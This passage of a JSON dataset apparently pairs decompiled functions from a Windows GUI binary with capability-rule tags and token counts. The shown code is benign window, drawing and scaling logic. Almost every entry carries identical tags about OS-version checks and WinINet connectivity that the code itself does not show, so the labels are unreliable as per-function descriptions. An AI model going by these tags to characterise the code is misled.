        "decompiled_code": "\nvoid __fastcall fcn.00444cd4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x94)) {\n        if ((*(in_EAX + 0x94) != 0) && (*(*(in_EAX + 0x94) + 0x1ac) != 0)) {\n            puStack40 = 0x444d19;\n            fcn.00415088();\n            puStack40 = 0x444d2a;\n            fcn.0041b820();\n        }\n        if (((param_2 != 0) && (param_2 != -1)) && (*(param_2 + 0x1ac) != 0)) {\n            puStack40 = 0x444d4a;\n            fcn.00414d8c();\n        }\n    }\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x400;\n    uStack44 = 0x444df4;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    if (param_2 != -1) {\n        puStack40 = &stack0xfffffffc;\n        fcn.00404154();\n    }\n    iVar1 = *(in_EAX + 0x94);\n    if (param_2 != iVar1) {\n        if (param_2 == -1) {\n            *(in_EAX + 0x94) = 0;\n        }\n        else {\n            *(in_EAX + 0x94) = param_2;\n            if (param_2 != 0) {\n                fcn.00404154();\n                fcn.0041b5e0();\n            }\n        }\n        if (iVar1 != 0) {\n            fcn.00404154();\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xfbff;\n    return;\n}\n",
        "token_count": 529
    },
    "00444f9c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00444f9c(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x44501d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.00406a50();\n        fcn.0040c5e8(in_stack_ffffffd4, arg_ch);\n        fcn.004047cc();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    (**(**(in_EAX + 0x30) + 0x40))();\n    *param_2 = *param_2 + *(in_EAX + 0x40);\n    param_2[1] = param_2[1] + *(in_EAX + 0x44);\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x445024;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 394
    },
    "00445138": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445138(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x94) != 0) && (*0x496518 == 0)) && (*0x4451a0 == (*0x44519c & *(in_EAX + 0x1c)))) {\n        var_8h = arg_8h;\n        fcn.00446870(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "004451b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004451b4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int32_t in_stack_ffffffd4;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    \n    if (param_2 != param_1) {\n        uVar2 = *0x445368;\n        if ((*(in_EAX + 7) & 1) != 0) {\n            uVar2 = *(in_EAX + 0x23);\n        }\n        if ((uVar2 & 1) != 0) {\n            in_stack_ffffffd4 = in_EAX[0x10];\n            in_stack_ffffffdc = param_1;\n            sub.kernel32.dll_MulDiv(in_stack_ffffffd4, param_2, param_1);\n        }\n        if ((uVar2 & 2) != 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n        }\n        if (((uVar2 & 4) == 0) || ((*(in_EAX + 0x51) & 1) != 0)) {\n            in_stack_ffffffdc = in_EAX[0x12];\n        }\n        else if ((uVar2 & 1) == 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        else {\n            sub.kernel32.dll_MulDiv(in_EAX[0x10] + in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        bVar3 = (uVar2 & 8) == 0;\n        if ((bVar3) || ((*(in_EAX + 0x51) & 2) != 0)) {\n            iStack32 = in_EAX[0x13];\n        }\n        else {\n            iStack32 = param_1;\n            if (bVar3) {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n            }\n            else {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11] + in_EAX[0x13], param_2, in_stack_ffffffd4);\n            }\n        }\n        fcn.00445058();\n        (**(*in_EAX + 0x88))(iStack32, in_stack_ffffffdc);\n        if (*0x445370 != (uVar2 & *0x44536c)) {\n            uVar1 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x175), param_2, iStack32);\n            *(in_EAX + 0x175) = uVar1;\n        }\n        if (*0x445370 != (uVar2 & *0x445374)) {\n            uVar1 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x179), param_2, iStack32);\n            *(in_EAX + 0x179) = uVar1;\n        }\n        if ((*(in_EAX + 0x59) == '\\0') && ((uVar2 & 0x10) != 0)) {\n            uVar1 = fcn.00420f5c(param_2, iStack32);\n            sub.kernel32.dll_MulDiv(uVar1);\n            fcn.00420f78();\n        }\n    }\n    *(in_EAX + 0x23) = *0x445370;\n    return;\n}\n",
        "token_count": 814
    },
    "004456d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004456d8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x59)) && (*(in_EAX + 0x59) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00446870(0);\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "00445720": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445720(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x8e)) && (*(in_EAX + 0x8e) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00446870(0);\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "00445770": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445770(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x5a)) && (*(in_EAX + 0x5a) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00446870(0);\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "004458cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004458cc(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x445962;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        uVar2 = 0;\n        fcn.00406a50();\n        fcn.0040c5e8(uVar2, arg_ch);\n        fcn.004047cc();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    uVar2 = (**(**(in_EAX + 0x30) + 0x48))();\n    sub.gdi32.dll_SetViewportOrgEx(uVar2, *(in_EAX + 0x40), *(in_EAX + 0x44), 0);\n    sub.gdi32.dll_IntersectClipRect(uVar2, 0, 0, *(in_EAX + 0x48), *(in_EAX + 0x4c));\n    *in_FS_OFFSET = uVar2;\n    fcn.00404da0(0x445969);\n    return;\n}\n",
        "token_count": 396
    },
    "00445974": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.00445974(int32_t lprcSrc1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lprcSrc2;\n    uint lprcDst;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    iVar1 = fcn.00414f48();\n    do {\n        do {\n            if (iVar1 < 1) {\n                return 0;\n            }\n            iVar1 = iVar1 + -1;\n            iVar2 = fcn.00414eec();\n        } while ((*(iVar2 + 0x57) == '\\0') || ((*(iVar2 + 0x50) & 0x40) == 0));\n        fcn.00444ebc();\n        sub.user32.dll_IntersectRect(&lprcDst, lprcSrc1 + -0x14, &lprcSrc2);\n        iVar2 = sub.user32.dll_EqualRect(&lprcDst, lprcSrc1 + -0x14);\n    } while (iVar2 == 0);\n    return var_1h;\n}\n",
        "token_count": 278
    },
    "00445a00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00445a00(uint param_1, char param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint var_15h;\n    int32_t var_4h;\n    \n    if (param_2 == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            return;\n        }\n        if ((*(in_EAX + 0x51) & 4) != 0) {\n            return;\n        }\n    }\n    if (*(in_EAX + 0x30) == 0) {\n        return;\n    }\n    var_4h = in_EAX;\n    cVar2 = fcn.0044d568();\n    if (cVar2 != '\\0') {\n        fcn.00444ebc();\n        if (((var_15h == '\\0') && ((*(*(var_4h + 0x30) + 0x50) & 0x40) == 0)) &&\n           (cVar2 = fcn.00445974(&stack0xfffffffc),  cVar2 == '\\0')) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n        uVar3 = fcn.0044d1c8(&var_15h + 1, -uVar1);\n        sub.user32.dll_InvalidateRect(uVar3);\n        return;\n    }\n    return;\n}\n",
        "token_count": 352
    },
    "00445aa0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.00445aa0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    unkbyte3 in_ECX;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = CONCAT13(in_ECX, in_ECX) & 0xff00ffff;\n    if (*(in_EAX + 0x12a) != 0) {\n        (**(in_EAX + 0x128))(auStack8 + 2, arg_8h, arg_ch, arg_10h, in_ECX);\n    }\n    return auStack8[2];\n}\n",
        "token_count": 174
    },
    "00445b74": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00445b74(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x57) != '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x51) & 4) == 0)))) &&\n       (in_EAX[0xc] != 0)) {\n        uStack20 = 0x445bb9;\n        cVar1 = fcn.0044d568();\n        if (cVar1 != '\\0') {\n            if ((*(in_EAX + 0x14) & 0x40) != 0) {\n                uStack20 = 0x445bd9;\n                uStack20 = fcn.0044d1c8();\n                puStack24 = 0x445bdf;\n                uVar2 = sub.user32.dll_GetDC();\n                uStack28 = 0x445c4d;\n                uStack32 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffe0;\n                uVar3 = uVar2;\n                puStack24 = &stack0xfffffffc;\n                sub.gdi32.dll_IntersectClipRect\n                          (uVar2, in_EAX[0x10], in_EAX[0x11], in_EAX[0x10] + in_EAX[0x12], in_EAX[0x11] + in_EAX[0x13]);\n                fcn.0044ad10();\n                *in_FS_OFFSET = uVar3;\n                uVar3 = fcn.0044d1c8(uVar2, 0x445c6a);\n                sub.user32.dll_ReleaseDC(uVar3);\n                return;\n            }\n            uStack20 = 0x445c5f;\n            (**(*in_EAX + 0x80))();\n            uStack20 = 0x445c6a;\n            (**(*in_EAX + 0x8c))();\n        }\n    }\n    return;\n}\n",
        "token_count": 513
    },
    "00445c74": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00445c74(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x492d08 + 0xd) != '\\0') && (*(in_EAX + 0x5f) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 69
    },
    "00445c8c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00445c8c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x492d08 + 0xd) != '\\0') && (*(in_EAX + 0x5f) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 70
    },
    "00445cbc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00445cbc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x492d08 + 0xd) != '\\0') && (iVar1 = *(in_EAX + 0x5f) - 1,  iVar1 < 2)) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 95
    },
    "00445cf4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00445cf4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    int32_t iStack20;\n    \n    cVar1 = fcn.00452474();\n    if (cVar1 != '\\0') {\n        fcn.00452534();\n    }\n    cVar1 = fcn.004040e4();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x8f) != '\\x01')) {\n        fcn.0040c668();\n        fcn.004047cc();\n    }\n    fcn.004468a4();\n    if ((*0x496514 == 0) || (*0x496514 == -1)) {\n        *0x496514 = 0;\n        if ((*(in_EAX + 0x54) & 1) != 0) {\n            sub.user32.dll_GetCursorPos(&iStack32);\n            fcn.004450dc();\n            iStack32 = iStack20;\n            uStack28 = uStack24 & 0xffff | iStack20 << 0x10;\n            fcn.00446870(uStack28);\n        }\n        if (*0x496514 != -1) {\n            fcn.00443544();\n        }\n    }\n    return;\n}\n",
        "token_count": 308
    },
    "00445df0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445df0(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    *arg_8h = 0;\n    if (*(in_EAX + 0xe2) != 0) {\n        *arg_8h = 1;\n        (**(in_EAX + 0xe0))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00445e2c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445e2c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xda) != 0) {\n        (**(in_EAX + 0xd8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "00445e78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445e78(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10a) != 0) {\n        (**(in_EAX + 0x108))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "00445f90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445f90(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xfa) != 0) {\n        (**(in_EAX + 0xf8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "00446010": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nchar __cdecl fcn.00446010(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    char var_ah;\n    uint var_9h;\n    uint uStack9;\n    uint var_1h;\n    \n    var_9h = *arg_8h;\n    uStack9 = arg_8h[1];\n    var_ah = '\\0';\n    if (*(in_EAX + 0x142) != 0) {\n        (**(in_EAX + 0x140))(&var_ah, &var_9h);\n    }\n    if (var_ah == '\\0') {\n        *(in_EAX + 0x98) = *(in_EAX + 0x98) + in_ECX;\n        while (uVar2 = *(in_EAX + 0x98) >> 0x1f,  0x77 < (*(in_EAX + 0x98) ^ uVar2) - uVar2) {\n            iVar1 = *(in_EAX + 0x98);\n            uVar2 = *(in_EAX + 0x98) >> 0x1f;\n            *(in_EAX + 0x98) = ((*(in_EAX + 0x98) ^ uVar2) - uVar2) + -0x78;\n            if (iVar1 < 0) {\n                if (*(in_EAX + 0x98) != 0) {\n                    *(in_EAX + 0x98) = -*(in_EAX + 0x98);\n                }\n                var_ah = fcn.00404154();\n            }\n            else {\n                var_ah = fcn.00404154();\n            }\n        }\n    }\n    return var_ah;\n}\n",
        "token_count": 424
    },
    "0044617c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044617c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    uStack52 = 0x446191;\n    iVar1 = (**(*param_2 + 0x38))();\n    if (var_1h == '\\0') {\n        var_20h = param_2[0x13];\n        var_1ch = param_2[0x14];\n        var_18h = param_2[0x15];\n        var_14h = param_2[0x16];\n    }\n    else {\n        var_20h = param_2[0x19];\n        var_1ch = param_2[0x1a];\n        var_18h = param_2[0x1b];\n        var_14h = param_2[0x1c];\n    }\n    uStack52 = 0x4461b8;\n    uVar2 = sub.user32.dll_GetDesktopWindow();\n    uStack52 = 0x402;\n    uStack56 = 0;\n    puStack64 = 0x4461cb;\n    uStack60 = uVar2;\n    uVar3 = sub.user32.dll_GetDCEx();\n    uStack68 = 0x446297;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &fcn.0044617c::var_1h + 1;\n    uVar4 = fcn.00421508();\n    uVar5 = sub.gdi32.dll_SelectObject(uVar3, uVar4);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h + iVar1, var_1ch, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_18h - iVar1, var_1ch + iVar1, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_14h - iVar1, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_1ch, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    uVar4 = uVar3;\n    sub.gdi32.dll_SelectObject(uVar3, uVar5);\n    *in_FS_OFFSET = uVar4;\n    sub.user32.dll_ReleaseDC(uVar2, uVar3, 0x44629e);\n    return;\n}\n",
        "token_count": 788
    },
    "004463b8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004463b8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint *arg_8h_00;\n    uint var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    if ((in_EDX == 0) || (in_EDX == -1)) {\n        iVar3 = *(in_EAX + 0x94);\n        if (((iVar3 == 0) || (*(iVar3 + 0x1db) == '\\0')) || (*(iVar3 + 0x1b0) == 0)) {\n            fcn.00413a6c();\n            var_1ch = var_24h;\n            var_18h = var_20h;\n            if (*(in_EAX + 0x30) != 0) {\n                fcn.0044502c();\n                var_1ch = var_24h;\n                var_18h = var_20h;\n            }\n        }\n        else {\n            (**(**(iVar3 + 0x1b0) + 0x14))();\n            var_34h = 2;\n            fcn.0044d1c8();\n            sub.user32.dll_MapWindowPoints();\n        }\n        uVar2 = fcn.00445538();\n        arg_8h_00 = &fcn.004463b8::var_34h;\n        uStack80 = 0x446469;\n        fcn.0044554c();\n        uStack80 = 0x446476;\n        fcn.00413abc(arg_8h_00, uVar2);\n        var_1ch = var_34h;\n        var_18h = uStack52;\n        uStack24 = uStack48;\n        uStack20 = uStack44;\n        uStack80 = 0x44648a;\n        var_5h = fcn.00446598();\n        goto code_r0x0044658b;\n    }\n    fcn.004468a4();\n    if (*(in_EAX + 0x94) == 0) {\ncode_r0x004464bd:\n        var_5h = 1;\n    }\n    else {\n        cVar1 = fcn.00404154();\n        if (cVar1 != '\\0') goto code_r0x004464bd;\n        var_5h = 0;\n    }\n    if (var_5h != 0) {\n        var_ch = fcn.004428e8();\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        if (*(in_EAX + 0x94) == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = fcn.0044d1c8();\n        }\n        fcn.00444ebc();\n        if (iVar3 != 0) {\n            sub.user32.dll_MapWindowPoints(iVar3, 0, &fcn.004463b8::var_1ch, 2);\n        }\n        *(var_ch + 8) = in_EDX;\n        *(var_ch + 0x5c) = arg_8h;\n        *(var_ch + 0x60) = var_4h;\n        *(var_ch + 0x4c) = var_1ch;\n        *(var_ch + 0x50) = var_18h;\n        *(var_ch + 0x54) = uStack24;\n        *(var_ch + 0x58) = uStack20;\n        uVar2 = fcn.0044d1c8(&fcn.004463b8::var_1ch, 1);\n        sub.user32.dll_MapWindowPoints(0, uVar2);\n        fcn.00404154();\n        *in_FS_OFFSET = var_18h;\n        uVar4 = fcn.00403f58(0x44658b);\n        return uVar4;\n    }\ncode_r0x0044658b:\n    return var_5h;\n}\n",
        "token_count": 999
    },
    "0044670c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044670c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xba) != 0) {\n        (**(in_EAX + 0xb8))(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "0044679c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
